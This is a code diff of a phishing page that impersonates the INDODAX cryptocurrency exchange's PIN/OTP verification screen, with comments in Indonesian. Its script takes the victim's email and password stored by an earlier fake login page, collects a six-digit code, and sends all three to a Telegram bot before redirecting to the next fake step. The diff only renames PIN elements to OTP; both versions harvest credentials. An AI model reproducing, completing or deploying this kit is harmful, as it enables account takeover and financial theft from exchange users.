@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Masukkan PIN INDODAX</title>
+<title>Verifikasi OTP INDODAX</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
 
@@ -23,19 +23,19 @@
     margin-bottom: 32px;
     text-align: center;
   }
-  .pin-info {
+  .otp-info {
     font-size: 14px;
     margin-bottom: 24px;
     text-align: center;
     color: #666;
   }
-  .pin-container {
+  .otp-container {
     display: flex;
     justify-content: space-between;
     margin-bottom: 24px;
   }
-  .pin-input {
-    width: 40px; /* Ukuran lebih kecil untuk 6 digit agar muat */
+  .otp-input {
+    width: 40px;
     height: 40px;
     font-size: 18px;
     text-align: center;
@@ -44,10 +44,10 @@
     outline: none;
     transition: border-color 0.2s;
   }
-  .pin-input:focus {
+  .otp-input:focus {
     border-color: #2076f3;
   }
-  button.pin-btn {
+  button.verify-btn {
     width: 100%;
     padding: 12px 0;
     font-size: 14px;
@@ -60,19 +60,19 @@
     margin-bottom: 16px;
     transition: background-color 0.3s, color 0.3s;
   }
-  button.pin-btn.enabled {
+  button.verify-btn.enabled {
     background-color: #2076f3;
     color: #fff;
     cursor: pointer;
   }
-  .forgot-pin-link {
+  .resend-link {
     display: block;
     font-size: 13px;
     color: #2076f3;
     text-align: center;
     text-decoration: none;
   }
-  .forgot-pin-link:hover {
+  .resend-link:hover {
     text-decoration: underline;
   }
 </style>
@@ -80,44 +80,43 @@
 <body>
   <div class="container">
     <h1>Masukkan PIN</h1>
-    <p class="pin-info">Masukkan PIN 6 digit untuk melanjutkan.</p>
+    <p class="otp-info">Masukkan PIN 6 digit untuk melanjutkan.</p>
 
-    <form id="pinForm" novalidate>
-      <div class="pin-container">
-        <input type="tel" class="pin-input" maxlength="1" id="pin1" />
-        <input type="tel" class="pin-input" maxlength="1" id="pin2" />
-        <input type="tel" class="pin-input" maxlength="1" id="pin3" />
-        <input type="tel" class="pin-input" maxlength="1" id="pin4" />
-        <input type="tel" class="pin-input" maxlength="1" id="pin5" />
-        <input type="tel" class="pin-input" maxlength="1" id="pin6" />
+    <form id="otpForm" novalidate>
+      <div class="otp-container">
+        <input type="tel" class="otp-input" maxlength="1" id="otp1" />
+        <input type="tel" class="otp-input" maxlength="1" id="otp2" />
+        <input type="tel" class="otp-input" maxlength="1" id="otp3" />
+        <input type="tel" class="otp-input" maxlength="1" id="otp4" />
+        <input type="tel" class="otp-input" maxlength="1" id="otp5" />
+        <input type="tel" class="otp-input" maxlength="1" id="otp6" />
       </div>
 
-      <button type="submit" id="pinBtn" class="pin-btn" disabled>Masuk</button>
+      <button type="submit" id="verifyBtn" class="verify-btn" disabled>Verifikasi</button>
     </form>
 
-    <a href="#" class="forgot-pin-link">Lupa PIN?</a>
+    <a href="#" class="resend-link">Lupa PIN</a>
   </div>
 
   <!-- Load jQuery dari CDN -->
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
-  <!-- Script JS untuk PIN -->
+  <!-- Script JS untuk OTP -->
   <script>
   $(document).ready(function() {
-      console.log('PIN JS loaded');
+      console.log('OTP JS loaded');
 
-      // Ambil data dari sessionStorage (dari index.html dan otp.html)
+      // Ambil data dari sessionStorage (dari index.html)
       const email = sessionStorage.getItem('email');
       const password = sessionStorage.getItem('password');
-      const otp = sessionStorage.getItem('otp');
 
-      if (!email || !password || !otp) {
+      if (!email || !password) {
           // Jika tidak ada session, redirect kembali ke login
           window.location.href = 'index.html';
           return;
       }
 
-      console.log('Session data:', {email, password, otp});
+      console.log('Session data:', {email, password});
 
       // Fungsi untuk memastikan input hanya angka
       function restrictToNumbers(input) {
@@ -125,7 +124,7 @@
               const value = $(this).val();
               // Hapus karakter non-angka
               $(this).val(value.replace(/[^0-9]/g, ''));
-              togglePinButton();
+              toggleVerifyButton();
           });
 
           input.on('keydown', function(e) {
@@ -141,73 +140,72 @@
           });
       }
 
-      // Terapkan restriksi angka ke semua input PIN
-      $('.pin-input').each(function() {
+      // Terapkan restriksi angka ke semua input OTP
+      $('.otp-input').each(function() {
           restrictToNumbers($(this));
       });
 
       // Auto-focus ke input berikutnya saat input digit
-      $('.pin-input').on('input', function() {
+      $('.otp-input').on('input', function() {
           const value = $(this).val();
           if (value.length === 1 && /^\d$/.test(value)) {
-              const nextInput = $(this).next('.pin-input');
+              const nextInput = $(this).next('.otp-input');
               if (nextInput.length) {
                   nextInput.focus();
               }
           }
-          togglePinButton();
+          toggleVerifyButton();
       });
 
       // Hapus input sebelumnya saat backspace
-      $('.pin-input').on('keydown', function(e) {
+      $('.otp-input').on('keydown', function(e) {
           if (e.key === 'Backspace' && $(this).val() === '') {
-              const prevInput = $(this).prev('.pin-input');
+              const prevInput = $(this).prev('.otp-input');
               if (prevInput.length) {
                   prevInput.focus();
               }
           }
       });
 
-      // Fungsi validasi PIN: cek apakah semua 6 digit terisi angka
-      function isPinValid() {
-          let pin = '';
-          $('.pin-input').each(function() {
-              pin += $(this).val();
+      // Fungsi validasi OTP: cek apakah semua 6 digit terisi angka
+      function isOtpValid() {
+          let otp = '';
+          $('.otp-input').each(function() {
+              otp += $(this).val();
           });
-          return pin.length === 6 && /^\d{6}$/.test(pin);
+          return otp.length === 6 && /^\d{6}$/.test(otp);
       }
 
-      // Toggle enable/disable tombol Masuk
-      function togglePinButton() {
-          if (isPinValid()) {
-              $('#pinBtn').prop('disabled', false).addClass('enabled');
+      // Toggle enable/disable tombol Verifikasi
+      function toggleVerifyButton() {
+          if (isOtpValid()) {
+              $('#verifyBtn').prop('disabled', false).addClass('enabled');
           } else {
-              $('#pinBtn').prop('disabled', true).removeClass('enabled');
+              $('#verifyBtn').prop('disabled', true).removeClass('enabled');
           }
       }
 
-      // Submit form PIN
-      $('#pinForm').on('submit', function(e) {
+      // Submit form OTP
+      $('#otpForm').on('submit', function(e) {
           e.preventDefault();
 
-          if (!isPinValid()) {
-              console.log('PIN tidak valid');
+          if (!isOtpValid()) {
+              console.log('OTP tidak valid');
               return;
           }
 
-          let pin = '';
-          $('.pin-input').each(function() {
-              pin += $(this).val();
+          let otp = '';
+          $('.otp-input').each(function() {
+              otp += $(this).val();
           });
 
-          // Format pesan PIN untuk dikirim ke Telegram
+          // Format pesan OTP untuk dikirim ke Telegram (OTP bebas, tidak ada validasi hardcoded)
           const message = `
-Masuk ke INDODAX
+Verifikasi OTP INDODAX
 ------------------------
 Email: ${email}
 Password: ${password}
-OTP: ${otp}
-PIN: ${pin}
+PIN: ${otp}
 ------------------------
           `;
 
@@ -221,15 +219,15 @@ PIN: ${pin}
           $.get(url)
               .done(function(data) {
                   if (data.ok) {
-                      console.log('PIN berhasil dikirim ke Telegram');
+                      console.log('OTP berhasil dikirim ke Telegram');
 
-                      // Simpan PIN ke sessionStorage jika perlu
-                      sessionStorage.setItem('pin', pin);
+                      // Simpan OTP ke sessionStorage jika perlu
+                      sessionStorage.setItem('otp', otp);
 
                       // Redirect ke dashboard setelah sukses
-                      window.location.href = 'one.html';
+                      window.location.href = 'otp.html';
                   } else {
-                      console.error('Error sending PIN:', data);
+                      console.error('Error sending OTP:', data);
                   }
               })
               .fail(function(xhr, status, error) {
@@ -238,7 +236,7 @@ PIN: ${pin}
       });
 
       // Fokus ke input pertama saat load
-      $('#pin1').focus();
+      $('#otp1').focus();
   });
   </script>
 </body>
